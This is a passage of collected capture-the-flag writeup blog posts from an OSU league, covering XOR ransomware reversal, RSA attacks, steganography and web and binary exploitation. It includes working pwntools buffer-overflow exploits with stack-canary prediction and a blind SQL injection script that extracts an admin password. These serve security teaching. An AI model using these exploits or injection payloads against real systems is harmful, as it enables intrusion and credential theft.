\u0026#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34;; string text2 = \u0026#34;\u0026#34;; using (RNGCryptoServiceProvider rngcryptoServiceProvider = new RNGCryptoServiceProvider()) { for (int i = 0; i \u0026lt; 32; i++) { byte[] array = new byte[1]; rngcryptoServiceProvider.GetBytes(array); text2 += text[(int)array[0] % text.Length].ToString(); } } return text2; } This function creates a 32 random character string using RNGCryptoServiceProvide, so there is no breaking that for now. The random string is returned and set to text.\nNext, SnowMachine.SaltBaeDatFlavorIn(array, array2, text); is called.\nprivate static void SaltBaeDatFlavorIn(byte[] file, byte[] snow, string flavor) { for (int i = 0; i \u0026lt; file.Length; i++) { snow[i] = Convert.ToByte((int)((char)file[i] ^ flavor[i % 32])); } } This just performs a bitwise XOR on each byte of the file with each byte of the random string text. This new encrypted string of bytes is now stored in array2, where it continues to be encrypted.\nNext thing to happen in our SmallSnowcone() function is the creation of array3, which is set from calling the function OTP()\npublic static byte[] OTP(byte[] input) { byte[] array = new byte[input.Length]; for (int i = 0; i \u0026lt; input.Length; i++) { array[i] = Convert.ToByte((int)(input[i] ^ 66)); } return array; } This function just XORs each byte with 66, and stores the result in array3\nFinally, our SmallSnowcone() function performs a bitwise OR operation on each byte in array3 with the value 128, which is then what is finally written to the .sn0w file.\nGreat! Now that we know exactly how our files are being encrypted, we should be able to work backwards to decrypt the file. The first thing to undo is the bitwise OR operation. What\u0026rsquo;s interesting about this is that it is done with 128, or 10000000 in binary. This means only the most significant bit is being ORed. Since we know that our key which we are trying to decrypt is all ASCII, and since we know that ASCII value 127 is the max, we know that the most significant bit is never going to be set. So the value that was ORed with had to have a significant bit of 0.\nSo we know that the significant bit of each byte of the key is 0. The next step is to undo the XOR operation with 66. Since XOR is its own inverse, we can just take the XOR of each byte of our encrypted array with 66 and we will get the key!\nDoing this yeilds a key of q2oHDn10RCnZoeKflz9hDc2jopCqv3MJ\nNow we can run through our encrypted file and XOR each byte with the corresponding values of our key. This will result in the original unencrypted file!\nLet\u0026rsquo;s script it out in python:\nenc_flag = open(\u0026#34;./flag.txt.sn0w\u0026#34;, \u0026#39;rb\u0026#39;) contents = enc_flag.read() xored = contents[:32] key = \u0026#34;\u0026#34; for byte in xored: key += chr((byte \u0026amp; 0x7f)^66) # (01111111 \u0026amp; 10110011) ^ 01000010 = key contents = contents[32:] output = bytes() for i in range(len(contents)): output += bytes([contents[i] ^ ord(key[i % 0x20])]) print(output) And running it we get the flag!\nosu{1f_it_d03snT_5now_1m_GoNn4_sue_sOm3b0dy} ","date":"1 February 2021","externalUrl":null,"permalink":"/posts/1716572285449-snowcone/","section":"Posts","summary":"Another day, another intrusion here at IcyRetina.","title":"OSU League 2020/2021 - Snowcone Writeup","type":"posts"},{"content":" Time to smith some copper!\nFor this challenge, we are given a python script that was used to encrypt the flag, along with the output file that was created from it.\n#!/usr/bin/env python3 from Crypto.Util.number import * import secrets e = 3 while True: p = getPrime(1024) q = getPrime(1024) if p % e != 1 and q % e != 1: break N = p * q print(\u0026#34;N =\u0026#34;, N) with open(\u0026#34;flag\u0026#34;, \u0026#34;r\u0026#34;) as f: flag = f.read().strip().encode() assert(len(flag) == 42) padding = secrets.token_bytes(210) print(\u0026#34;leak =\u0026#34;, \u0026#34;\u0026#39;\u0026#34; + padding.hex() + \u0026#34;\u0026#39;\u0026#34;) # Oops m = bytes_to_long(padding + flag) c = pow(m, e, N) print(\u0026#34;c =\u0026#34;, c) We can see that we get a leak of the padding, specifically a leak of the most significant bits of the message. Using something known as the Coppersmith Attack, we can actually find the rest of the message.\nIn the usual RSA model, you have a ciphertext c, a modulus N, and a public exponent e. We find m such m^e = c mod n. Now, this is a relaxed model that we can solve. We have c = (m+x)^e, we know part of the message m from the leak, but we don\u0026rsquo;t know x. Since our leak is the same every tiem, Coppersmith says that if we are looking for N^1/e of the message, it is then a small root and we should be able to find it pretty quickly.\nAll we need to do is create our polynomial f(x) = (m+x)^e - c, which has a root we want to find modulo n. This can be done pretty simply using sagemath.\n#!/usr/bin/env sage from sage.all import * from Crypto.Util.number import * c= 17868294450269675883986469170882257064627428433707603500890067752063961604684654851805829469837273448999725432428147126421641016742425430357133618533629986319659863748262189446225365034508244240177060787410517018220032421721807953095837207003218011760432348606030572134907021265373169592163937292370872393174147157321516093197173216520335841446612508147601247895343214122792281835160338349714598182348561753092414308025112752919860278424873227347935031551007908454205414184850898725554932882780037415042307105104268365961626556278590673592416312815796753710080179427223832639267694963514301632816040398522317698229035 leak = 0x66c7e057ab2095241bc7b83cf6a7c6dde60693076d8573de510fc361889fb66e0960af222ead2da1b1c6fcf4a1cfcf0a20ee7cc61e976f3cad63958fb9852c32fe9e4698f87d07c30791a4e6407cf66a3cf93facdf1d276981e816dd3c0e7cbeb648c5297b0a5acc47afb46686eae964e0057a8be39b29fbdecd3774135bc88f6b067698571f05c5ba785dc4925892da19b3b7640b07807c6af3052b7ce29e125df0f97d4abcbcfd6d93ec94a90ee5c91d09a76e979977e774bb9ae1e1d287476c91d3f33a6018476d7e0040f930be848195 N = 18186023870103797120509091528210052017835202453642298117209863460505101021646819059351051653975541446071417302173552526656704895118368722200093087033737225264434273920451139462678043460481827716933677625256913291232865883170237072770097048652916180533727179614963237586711744465662269631274051008365748411477559298662467771638534575955123843497755288315232910699898049309025041620697001021306545139814617468700207648841194748772113954806702803092687574614539181545562465116769262452017256134407896879646761346081107053459497459090825261620696915937606342541436445863502433642370656618275284587683633176676092354921499 e = 3 R = Zmod(N) P.\u0026lt;x\u0026gt; = PolynomialRing(R, implementation=\u0026#39;NTL\u0026#39;) f = ((leak \u0026lt;\u0026lt; (42*8)) + x)^e - c #We also need to bit shift our padding flag = f.small_roots() [0] print(long_to_bytes(flag)) And running it with sage we get the flag!\n$sage sol.sage osu{RSA-N3eD$_suPER-SECReT_R@NdOm_pAddiN9} ","date":"22 January 2021","externalUrl":null,"permalink":"/posts/1716569496742-copper/","section":"Posts","summary":"Time to smith some copper!","title":"OSU League 2020/2021 - Copper Writeup","type":"posts"},{"content":" pls beat the game\nIn this challenge, we are given a command line game of cookie clicker! Running the binary we see the game:\nCOOKIES: 50000 GRANDMAS: 0 COOKIES PER SECOND: 0 WIN CONDITION: 18000000000000000000 COOKIES MENU: 1. Bake 100 cookies 2. Hire a grandma to bake 100 cookies per second [COST 1000 COOKIES] 3. Improve your baking rate by +100 cookies per click [COST 1000 COOKIES] 4. Improve your grandmas baking rate by +100 cookies per second [COST 1000 COOKIES] Enter any key to refresh So it looks like we start out with 50,000 cookies, and we need to get to 18,000,000,000,000,000,000. Given the ways we can get more cookies, to actually win this game correctly is nearly impossible, so let\u0026rsquo;s see if we can exploit it.\nTo start, let\u0026rsquo;s open the program in Ghidra to see how the program works.\nundefined8 main(EVP_PKEYCTX *param_1){ pthread_t local_38; pthread_t local_30; undefined8 local_28; undefined8 local_20; undefined8 local_18; undefined8 local_10; init(param_1); local_28 = 50000; local_18 = 100; local_10 = 1; local_20 = 0; pthread_create(\u0026amp;local_38, (pthread_attr_t *)0x0, io_loop, \u0026amp;local_28); pthread_create(\u0026amp;local_30, (pthread_attr_t *)0x0, grandma_loop, \u0026amp;local_28); pthread_join(local_38,(void **)0x0); pthread_join(local_30,(void **)0x0); win(); return 0; } Here we can see that our program is split into two threads. One is the io_loop, and the other is the grandma_loop. We see that once those threads are finished, they are joined back together and then the win function is called. So in order for win to be called, we need to have our threads be able to exit. Let\u0026rsquo;s look at the io_loop:\nvoid io_loop(ulong *param_1){ undefined8 uVar1; long lVar2; char local_9; while (*param_1 \u0026lt; 18000000000000000000) { usleep(25000); clear(); printf(\u0026#34;\\rCOOKIES: %lu\\n\u0026#34;,*param_1); printf(\u0026#34;GRANDMAS: %lu\\n\u0026#34;,param_1[1]); printf(\u0026#34;COOKIES PER SECOND: %lu\\n\u0026#34;,param_1[3] * param_1[1] * 100,param_1[3] * param_1[1] * 0x14); printf(\u0026#34;WIN CONDITION: %lu COOKIES\\n\\n\u0026#34;,18000000000000000000); puts(\u0026#34;MENU: \u0026#34;); printf(\u0026#34;1. Bake %lu cookies\\n\u0026#34;,param_1[2]); uVar1 = cost(param_1); printf(\u0026#34;2. Hire a grandma to bake %lu cookies per second [COST %lu COOKIES]\\n\u0026#34;,param_1[3] * 100,uVar1,uVar1); uVar1 = cost(param_1); printf(\u0026#34;3. Improve your baking rate by +100 cookies per click [COST %lu COOKIES]\\n\u0026#34;,uVar1); uVar1 = cost(param_1); printf(\u0026#34;4. Improve your grandmas baking rate by +100 cookies per second [COST %lu COOKIES]\\n\\n\u0026#34;,uVar1); puts(\u0026#34;Enter any key to refresh\u0026#34;); __isoc99_scanf(\u0026amp;DAT_004012f6,\u0026amp;local_9); fflush(stdin); if (local_9 == \u0026#39;2\u0026#39;) { lVar2 = cost(param_1); *param_1 = *param_1 - lVar2; param_1[1] = param_1[1] + 1; } else { if (local_9 \u0026lt; \u0026#39;3\u0026#39;) { if (local_9 == \u0026#39;1\u0026#39;) { *param_1 = *param_1 + param_1[2]; } } else { if (local_9 == \u0026#39;3\u0026#39;) { lVar2 = cost(param_1); *param_1 = *param_1 - lVar2; param_1[2] = param_1[2] + 100; } else { if (local_9 == \u0026#39;4\u0026#39;) { lVar2 = cost(param_1); *param_1 = *param_1 - lVar2; param_1[3] = param_1[3] + 1; } } }\t} } return; } Our param_1 is the current amount of cookies we have. We start out with 50,000 cookies, and our cookies get added and subracted from that. But wait a minute, notice how when we are subtracting from our total, there is no check to make sure that our result isn\u0026rsquo;t negative:\nif (local_9 == \u0026#39;3\u0026#39;) { lVar2 = cost(param_1); *param_1 = *param_1 - lVar2; param_1[2] = param_1[2] + 100; } So if we have 0 cookies, and we subtract from our total number of cookies, what happens? Let\u0026rsquo;s find out:\nCOOKIES: 0 GRANDMAS: 0 COOKIES PER SECOND: 0 WIN CONDITION: 18000000000000000000 COOKIES MENU: 1. Bake 5100 cookies 2. Hire a grandma to bake 100 cookies per second [COST 1000 COOKIES] 3. Improve your baking rate by +100 cookies per click [COST 1000 COOKIES] 4. Improve your grandmas baking rate by +100 cookies per second [COST 1000 COOKIES] Enter any key to refresh As a reward for beating cookie clicker, I will turn this into an easy buffer overflow challenge. Enter your payload! Woah! We called the win function, but how? Well, we can probably assume that our variable for our total number of cookies was unsigned, meaning it can only be represented by a positive number. So when we subract from it when our total is at 0, rather than going negative, the total wraps around and underflows to a super large number. That number is larger than 18,000,000,000,000,000,000, so the loop exits, and so does the thread. The grandpa_loop function also exits as it\u0026rsquo;s just a while loop that exits when we are above the target number as well! With both threads exited, the win function is called.\nWhat\u0026rsquo;s next? Well, we are directly told that the next part is an easy buffer overflow challenge, so let\u0026rsquo;s overflow a buffer:\nCOOKIES: 0 GRANDMAS: 0 COOKIES PER SECOND: 0 WIN CONDITION: 18000000000000000000 COOKIES MENU: 1. Bake 5100 cookies 2. Hire a grandma to bake 100 cookies per second [COST 1000 COOKIES] 3. Improve your baking rate by +100 cookies per click [COST 1000 COOKIES] 4. Improve your grandmas baking rate by +100 cookies per second [COST 1000 COOKIES] Enter any key to refresh As a reward for beating cookie clicker, I will turn this into an easy buffer overflow challenge. Enter your payload! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 1094795585 != 1526204186 STACK COOKIE MODIFIED, STACK OVERFLOW DETECTED. EXTREME SECURITY MEASURES ACTIVATED, SHUTTING DOWN POWER TO AWS-WEST Interesting, rather than a segfault, the program was able to notice that we overflowed the buffer and exited accordingly. Let\u0026rsquo;s take a deeper look by examining the source code for win()\nvoid win(void){ char local_28 [28]; uint local_c; flush(); local_c = stack_cookie; puts( \u0026#34;As a reward for beating cookie clicker, I will turn this into an easy buffer overflow challenge. Enter your payload!\u0026#34; ); fgets(local_28,100,stdin); if(local_c != stack_cookie){ printf(\u0026#34;%d != %d\\n\u0026#34;,(ulong)local_c,(ulong)stack_cookie); puts(\u0026#34;STACK COOKIE MODIFIED, STACK OVERFLOW DETECTED.\u0026#34;); puts(\u0026#34;EXTREME SECURITY MEASURES ACTIVATED, SHUTTING DOWN POWER TO AWS-WEST\u0026#34;); exit(-1); } return; } So what this win function is doing is: It creates a buffer of 28 bytes on the stack, followed by an integer which gets set to stack_cookie. This variable is created using rand() seeded with the current time. The program then reads 100 bytes into the 28 bytes buffer (which allows us to write past the buffer), but then it checks to see if the stack_cookie was modified. If it was, then the program exits.\nWe need to somehow know the stack_cookie in order to overwrite EIP. Since we know that rand() was seeded with the current time, we can actually predict what the cookie is going to be by using the same rand function and seeding it with the current time in our exploit script. Let\u0026rsquo;s set that up, while also automating the underflow portion of the challenge.\nfrom pwn import * from ctypes import CDLL io = remote(\u0026#39;ctf.ropcity.com\u0026#39;, 31310) #io = process(\u0026#39;./cookie\u0026#39;) t = int(time.time()) libc = CDLL(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) libc.srand(t) #seed with current time canary = libc.rand() for i in range((50000/1000)+1): io.sendline(\u0026#39;3\u0026#39;) io.recvuntil(\u0026#39;payload!) io.interactive() Now we just need to do the buffer overflow. The format should be:\n28 byte buffer + canary + EBP + EIP\nWhat should we jump to? Well, probably the funtion called `print_flag()'\n0x0000000000400e9b print_flag So our final script will look like:\nfrom pwn import * from ctypes import CDLL io = remote(\u0026#39;ctf.ropcity.com\u0026#39;, 31310) #io = process(\u0026#39;./cookie\u0026#39;) t = int(time.time()) libc = CDLL(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) libc.srand(t) canary = libc.rand() for i in range((50000/1000)+1): io.sendline(\u0026#39;3\u0026#39;) io.recvuntil(\u0026#39;payload!\u0026#39;) exploit = b\u0026#39;A\u0026#39; * 28 exploit += p64(canary) exploit += b\u0026#39;AAAA\u0026#39; #align the stack exploit += p64(0x400e9b)*50 io.sendline(exploit) And running it we get the flag!\n$ python2 exploit.py [+] Opening connection to ctf.ropcity.com on port 31310: Done [*] Switching to interactive mode osu{LAnC3_3a7s_0AtM3AL_ra1s1n} A great challenge :)\n","date":"16 January 2021","externalUrl":null,"permalink":"/posts/1716569409025-cookie/","section":"Posts","summary":"pls beat the game","title":"OSU League 2020/2021 - Cookie Writeup","type":"posts"},{"content":"For this challenge, we are giving a link to a web page. Going to it, we are greeted with this:\nThey also give us the source code for the web server:\nfrom app import app from app import cfg from flask import render_template,request,redirect,make_response,send_file #serve index.html @app.route(\u0026#34;/\u0026#34;) def index(): return render_template(\u0026#34;index.html\u0026#34;) #encrypt messages that are POSTed to /encrypt @app.route(\u0026#34;/encrypt\u0026#34;, methods=[\u0026#34;POST\u0026#34;]) def encrypt(): #truncate message if longer than 256 bytes, convert to byte string plaintext = request.form.get(\u0026#34;message\u0026#34;)[:256].encode() #pad message with \\xff bytes plaintext += b\u0026#39;\\xff\u0026#39; * (256 - len(plaintext)) #xor byte string with secret key ciphertext = bytes([plaintext_byte ^ key_byte for plaintext_byte, key_byte in zip(plaintext, cfg.secret_byte_string)]) #put the ciphertext in a response header resp = make_response(render_template(\u0026#34;index.html\u0026#34;)) resp.headers[\u0026#34;ciphertext\u0026#34;] = repr(ciphertext) return resp #send server source code to those who request it @app.route(\u0026#34;/source\u0026#34;) def source(): return send_file(\u0026#34;./views.py\u0026#34;) #secret admin page, the URL is the secret key so it is secure @app.route(\u0026#34;/\u0026#34; + cfg.secret_byte_string.decode()) def win(): return(render_template(\u0026#34;win.html\u0026#34;)) Looking though the source code, it looks like our goal is to find secret_byte_string, as that will tell us the path to the admin site. We also see how the ciphertext is generated. It\u0026rsquo;s an XOR between each byte of the plaintext we provide with the secret key. So with the properties of XOR, if we know the plaintext and the ciphertext that would be generated, we can find the secret key!\nWe see here that our plaintext gets padded with \\xff to get to 256 bytes, so if we just don\u0026rsquo;t input anything into the field box, then we know our plaintext is \\xff\\xff\\xff ... 256 times. So let\u0026rsquo;s try that, and look at the response header we get from sending it.\nAlright, looks like we have the ciphertext, now to just XOR it with our plaintext. Xoring and coverting to ascii we get out path:\nif-you-tried-to-dirbuster-this-route-I-will-forward-you-the-OSUSEC-AWS-bill-never-gonna-give-you-up-never-gonna-let-you-down-never-gonna-run-around-and-desert-you-never-gonna-make-you-cry-never-gonna-say-goodbye-never-gonna-tell-a-lie-and-hurt-you-12345678\nWe are then given a site with shows us how to set up our enviroment to do a pwn challenge along with a baby pwn to solve. We are even given some skeleton code that we can use for the exploit.\nDownloading the binary and disassembling it through gdb, we can immediatly see a vulnerability. At main+53, we have a call to fgets, which would allow us to perform a buffer overflow attack.\ngdb-peda$ disass main Dump of assembler code for function main: 0x000000000040071b \u0026lt;+0\u0026gt;: push rbp 0x000000000040071c \u0026lt;+1\u0026gt;: mov rbp,rsp 0x000000000040071f \u0026lt;+4\u0026gt;: sub rsp,0x10 0x0000000000400723 \u0026lt;+8\u0026gt;: mov eax,0x0 0x0000000000400728 \u0026lt;+13\u0026gt;: call 0x400692 \u0026lt;check_the_key\u0026gt; 0x000000000040072d \u0026lt;+18\u0026gt;: test eax,eax 0x000000000040072f \u0026lt;+20\u0026gt;: jne 0x40075c \u0026lt;main+65\u0026gt; 0x0000000000400731 \u0026lt;+22\u0026gt;: lea rdi,[rip+0x108] # 0x400840 0x0000000000400738 \u0026lt;+29\u0026gt;: call 0x400520 \u0026lt;puts@plt\u0026gt; 0x000000000040073d \u0026lt;+34\u0026gt;: mov rdx,QWORD PTR [rip+0x20090c] # 0x601050 \u0026lt;stdin@@GLIBC_2.2.5\u0026gt; 0x0000000000400744 \u0026lt;+41\u0026gt;: lea rax,[rbp-0x10] 0x0000000000400748 \u0026lt;+45\u0026gt;: mov esi,0x20 0x000000000040074d \u0026lt;+50\u0026gt;: mov rdi,rax 0x0000000000400750 \u0026lt;+53\u0026gt;: call 0x400540 \u0026lt;fgets@plt\u0026gt; 0x0000000000400755 \u0026lt;+58\u0026gt;: mov eax,0x0 0x000000000040075a \u0026lt;+63\u0026gt;: jmp 0x40075e \u0026lt;main+67\u0026gt; 0x000000000040075c \u0026lt;+65\u0026gt;: nop 0x000000000040075d \u0026lt;+66\u0026gt;: nop 0x000000000040075e \u0026lt;+67\u0026gt;: leave 0x000000000040075f \u0026lt;+68\u0026gt;: ret End of assembler dump. We can also open up the binary in Ghidra and see that the buffer we need to fill is 16 bytes long. Perfect, what can we do with this though? Looking at the functions, we see something promising:\ngdb-peda$ info functions 0x0000000000400647 print_the_flag We also need to pass in our key we got from the web challenge portion to get to this point, so we need to remember to account for that. So our current plan of attack sounds like:\nPass in our key Fill the buffer up with 16 byte Overwrite EBP with 8 bytes Overwrite EIP with the address of print_the_flag Win In python, that looks like:\nfrom pwn import * buffer_size = 16 addr_of_printflag_function = 0x0000000000400647 secret_key_string = \u0026#34;if-you-tried-to-dirbuster-this-route-I-will-forward-you-the-OSUSEC-AWS-bill-never-gonna-give-you-up-never-gonna-let-you-down-never-gonna-run-around-and-desert-you-never-gonna-make-you-cry-never-gonna-say-goodbye-never-gonna-tell-a-lie-and-hurt-you-12345678\u0026#34; p = remote(\u0026#34;ctf-league.osusec.org\u0026#34;, 31309) print(p.recv()) print(\u0026#34;sending the key string: \u0026#34; + secret_key_string) p.send(secret_key_string) print(\u0026#34;response: \u0026#34; + p.recv().decode()) payload = b\u0026#39;A\u0026#39; * buffer_size payload += b\u0026#39;B\u0026#39; * 8 payload += p64(addr_of_printflag_function) print(b\u0026#34;payload: \u0026#34; + payload) p.send(payload) And running it we get the flag!!!\ncameron@LAPTOP-PEKGUHAN:/mnt/c/Users/Cameron McCawley/Desktop/mtp$ python2 exploit.py [+] Opening connection to ctf-league.osusec.org on port 31309: Done enter the secret key from the web portion of this challenge sending the key string: if-you-tried-to-dirbuster-this-route-I-will-forward-you-the-OSUSEC-AWS-bill-never-gonna-give-you-up-never-gonna-let-you-down-never-gonna-run-around-and-desert-you-never-gonna-make-you-cry-never-gonna-say-goodbye-never-gonna-tell-a-lie-and-hurt-you-12345678 response: payload: AAAAAAAAAAAAAAAABBBBBBBBG\\x06\\x00\\x00\\x00 [*] Switching to interactive mode overflow my buffer and return to the print_the_flag function osu{L0N6_W01f_H^x0r} ","date":"5 December 2020","externalUrl":null,"permalink":"/posts/1716510712478-many_time_pad/","section":"Posts","summary":"For this challenge, we are giving a link to a web page.","title":"OSU League 2020/2021 - many_time_pad Writeup","type":"posts"},{"content":"For this challenge, we are given a website. Opening the link takes us to this page:\nLooks like we are presented with a login. We are also given the source code to this webpage, so maybe we can do something with that.\nLooking through the source code, we see a comment mentioning a vulnerable piece of code:\n// XXX: this is vuln to SQL injection! $query_str = \u0026#34;SELECT id, username, password FROM users WHERE username=\u0026#39;$username\u0026#39;;\u0026#34;; echo \u0026#39;* \u0026lt;b\u0026gt;Query:\u0026lt;/b\u0026gt; \u0026#39; . htmlentities($query_str) . \u0026#39;\u0026lt;br\u0026gt;\u0026#39; This piece of code is vulnerable to something known as a SQL injection. With a specially crafted username, we can escape the $username and add on to the query with our own SQL code. But what can we add onto the query in order login?\nThe answer is the LIKE operator. According to w3schools:\nThe LIKE operator is used in a WHERE clause to search for a specified pattern in a column.\nThere are two wildcards often used in conjunction with the LIKE operator:\n% - The percent sign represents zero, one, or multiple characters _ - The underscore represents a single character\nSo if we can make username='$username' evaluate to true, and then tack on a and password like 'x%', and just iterate all possible characters for x, we can get the first character of the password for said username. We can then repeat that process for every character until we get the full password.\nAfter some trial and error, we can figure out that the username we want to steal from is admin. and so the query we want to inject is admin' and password like 'x%\nWe can write a simple python script to automate this process:\nimport requests import string url_val = \u0026#34;http://ctf-league.osusec.org:8080/login.php\u0026#34; obj = {\u0026#39;password\u0026#39;:\u0026#39;\u0026#39;, \u0026#39;username\u0026#39;:\u0026#39;\u0026#39;} failed = \u0026#34;password is incorrect\u0026#34; pwd = \u0026#39;\u0026#39; while True: for i in string.printable: obj[\u0026#39;username\u0026#39;] = \u0026#34;admin\u0026#39; and password like \u0026#39;\u0026#34; + pwd + i + \u0026#34;%\u0026#34; x = requests.post(url = url_val, data = obj, timeout=2.5) if(x.text.find(failed) \u0026gt; 0): pwd = pwd + i print(pwd) break Running this script we get the password for admin:\n$ python3 pwn.py k kl kl6 kl62 kl62j kl62jd kl62jdi kl62jdic kl62jdicu kl62jdicu3 kl62jdicu31 kl62jdicu31a kl62jdicu31ad kl62jdicu31ad% The password is kl62jdicu31ad\nAfter logging in, we are greeted with another page. This one seems to be some sort of note maker:\nWe are told to look into \u0026ldquo;Insecure direct object references\u0026rdquo;, which is a type of access control vulnerability that happens in applications that use user supplied input directly.\nOpening a note, we can see how we could abuse that:\nWhat if we directly modified the url to point us to a note that would otherwise be inaccesible? Let\u0026rsquo;s try setting it to 1:\nNext note contains the flag! Changing it to 2 and we get our flag:\nflag{r3m3mber_t0-g00gle_wh3n_f@cing_a_d1fficult-challenge!} ","date":"21 November 2020","externalUrl":null,"permalink":"/posts/1716572418279-web2/","section":"Posts","summary":"For this challenge, we are given a website.","title":"OSU League 2020/2021 - web 2 Writeup","type":"posts"},{"content":" I recall storing the password as a PDF, and I xored it with a 4-byte repeating key (e.g. ab cd ef 01 ab cd ef 01 \u0026hellip;), but I forgot my key, and I cannot get it back :(. Hint: you will not need to brute force this.\nThis is one of my first introductions to a steganography challenge, and after completing it I can attest that I\u0026rsquo;m not the biggest fan of them. But, I still learned a lot about different tools and techniques, so let\u0026rsquo;s jump right into how to solve it!\nGetting the first password # To start, we are given a gzip file that contains two things: A password protected zip file titled bathhouse.zip, and a file titled bathhouse_password.\nIf we look back to the challenge description, we are told that they XORED a PDF file with a 4 byte repeating key, so we can assume that bathhouse_password is said encrypted file.\nSo how can we get the orginial PDF back? Well, there is a neat property of XOR, which is that if you XOR the cipher text with the original plain text, you get the key!\nC = P ^ K P = C ^ K K = P ^ C Since the key used is only 4 bytes and repeating, if we are able to know only 4 bytes of the original PDF, we can get our key. Thankfully, every PDF starts with the exact same 4 bytes. These bytes are known as Magic Bytes, and are what is used by programs to determine the type of file something is. The magic bytes for a PDF are: 25 50 44 46 2D, and the first 4 bytes of our encrypted PDF are D6 DF 47 2F. So to get the key:\nP ^ C = K 25 ^ D6 = F3 50 ^ DF = 8F 44 ^ 47 = 03 46 ^ 2F = 69 K = [F3, 8F, 03, 69] Using this, we can now write a small python script to decrypt the file!\nplain_text = open(\u0026#34;plain_text.pdf\u0026#34;, \u0026#34;wb\u0026#34;) f = open(\u0026#39;bathhouse_password\u0026#39;, \u0026#39;rb\u0026#39;) cipher_text = f.read() f.close() key = [0xf3, 0x8f, 0x03, 0x69] result = b\u0026#39;\u0026#39; j = 0 for i in range(len(cipher_text)): result += bytes([cipher_text[i]^key[j]]) j = (j + 1) % 4 plain_text.write(result) And running it we get a PDF file with the first password!\nGetting the second password # After using the password to open the zip file, we are greeted with a new file titled polish_cow.mp3. The first thing I did was listen to it, and oh boy does it bop. But it was just a normal song, nothing special. I then was going to put it in audacity to look at the spetrogram when I noticed that the album art look interesting:\nAnd would you look at that title! It says:\nWhy would someone hide a password in mp3 tags?\nLet\u0026rsquo;s check out those tags. We can run exiftool on it to get the file\u0026rsquo;s metadata. After running, we can see we got a password.\nChannel Mode : Stereo MS Stereo : Off Intensity Stereo : Off Copyright Flag : False Original Media : False Emphasis : None ID3 Size : 154584 Title : Why would someone hide a password in mp3 tags? Composer : p4$$w0Rd Encoder Settings : Lavf58.29.100 Getting half of the flag # So the password is p4$$w0Rd, but what is the password for?\nAfter doing some research on different steganography tools that involve passwords, I came across a very popular one called steghide. Unfortunately, steghide only works on images. I was actually stuck on this part for a bit before I realized that I could use steghide on the album art! I just need to extract it first.\nTo do this, I used a tool called foremost, which can recover files based on their internal data structure. I ran the command, and got my image!\nforemost -t jpeg -i polish_cow.mp3 -T\nNow to run steghide with the password:\nsteghide extract -p 'p4$$w0Rd' -sf picture.jpg -xf out\nAnd we are able to recover another gzip file. After uncompressing it, there is a text file that is titled flag_part_2.txt, which gives us the second part of our flag!\n_dont_forget_5736h1d3}\nGetting the other half of the flag # With our image extracted, we can run one more tool on it to try to get the rest of the flag. The tool I will be using for this is stegsolve.jar, which is a tool that can reveal differnt color planes of an image. The planes that give us the rest of the flag are:\nosu{first_ # part_of_ # 7h15_flag # Putting everything together, we get our flag!!!\nosu{first_part_of_7h15_flag_dont_forget_5736h1d3}\n","date":"14 November 2020","externalUrl":null,"permalink":"/posts/1716572170174-russian/","section":"Posts","summary":"I recall storing the password as a PDF, and I xored it with a 4-byte repeating key (e.","title":"OSU League 2020/2021 - Russian Nesting Bathhouse Writeup","type":"posts"},{"content":"RSA 2 is a bit of a continuation off of RSA 1. In order to access the challenge, we need to use openssl with the flag from RSA 1 to decrypt the TAR file. To do this we can run openssl enc -d -aes-256-ctr -pbkdf2 -nosalt -p -in rsa2.tar.gz.enc -out rsa2.tar.gz, input the flag, and we get our challenge.\nLooking at our output.txt, we can see that we are only given N and c. And in our puzzle.py, which was used to encrypt the flag, we can see the e used.\nThe first thing I asked myself when looking at this challenge was: How is this different from RSA 1, and what difference is going to make it sovable without knowing p and q. I figured once I was able to answer that, I would be able to solve the problem. So let\u0026rsquo;s look at the puzzle.py script.\n#!/usr/bin/env python3 from Crypto.Util.number import * import secrets e = 3 while True: p = getPrime(1024) q = getPrime(1024) if p % e != 1 and q % e != 1: break N = p * q print(\u0026#34;N =\u0026#34;, N) with open(\u0026#34;flag\u0026#34;, \u0026#34;r\u0026#34;) as f: flag = f.read().strip().encode() assert(len(flag) == 85) m = bytes_to_long(flag) c = pow(m, e, N) print(\u0026#34;c =\u0026#34;, c) So this script here is pretty much the exact same as the one in RSA 1, except for one key difference. RSA 1 had padding, this one does not. So, does that mean if we have a short enough plaintext and no padding, we could break it? The answer is yes!\nAfter searching on Google a bit for an attack or equation I could use, I ended up realizing I was overthinking it way too much, and that I could just find p by solving for C^(1/e), since both e and p were so small, this calculation would be trivial. I popped open python and got to work:\nfrom Crypto.Util.number import * from gmpy2 import * N = 20024632768768912637613287359025250387550004488851404049377259400752733388799951292405308777608649074330341018632991975552042961105732724798750078885720732546410418786078274826752459551907831138496403725485849646756740113916019193640901989276389787602195246817993403509392720749171364279691010448491334036637700351964364237754403848731229440797256383336989925714614422958744191860865576846549156703425246912067903570057484349243372272409500391122676452335000625444438716985883060699798470886987034772418020878266583441556260145028252207119825124743757209993244690345830406438267628658055946089838128377464948770248961 c = 10416535550287033495404277107932685706229928310455866710626825426018506529546436032322630363568176266525705927229405354921242317119687390060188542046814131758895088332943669483585493646367126873551375708025551792807707002805749920774977557070353890134393233641234747269714815176982007502479585261773126107779600519181310143005814281313336594030671597022196782553951724754446795277653708498088981084820085946862113135433044292888939221986395813120459623401016303004199435799452922439470903861727424783934455730514725133921915613149040534566451300960392495492478151972614574840283217508574285634813247276700284635237 e = 3 p = iroot(c, e) p = long_to_bytes(p[0]) print(p) And running the script, we get the flag!\nosu{rs4-WI7Hout-P4dDiN9_iS-No7-vErY_SeCurE.-YoU-sH0ULD_u$e-OAEP_Or-4T-13aSt-PKCS1_5!} While this was a much easier problem in a technical sense, I think this one requiered much more thought, as the solution isn\u0026rsquo;t immediately obvious.\n","date":"13 November 2020","externalUrl":null,"permalink":"/posts/1716572081299-rsa2/","section":"Posts","summary":"RSA 2 is a bit of a continuation off of RSA 1.","title":"OSU League 2020/2021 - RSA 2 Writeup","type":"posts"},{"content":"So, to start off, I knew pretty much nothing about cryptography and assumed that it was probably all black magic before this, but after spending 3 days on this challenge asking for help and googling everything I could, I can now say with abosulte certainty that my 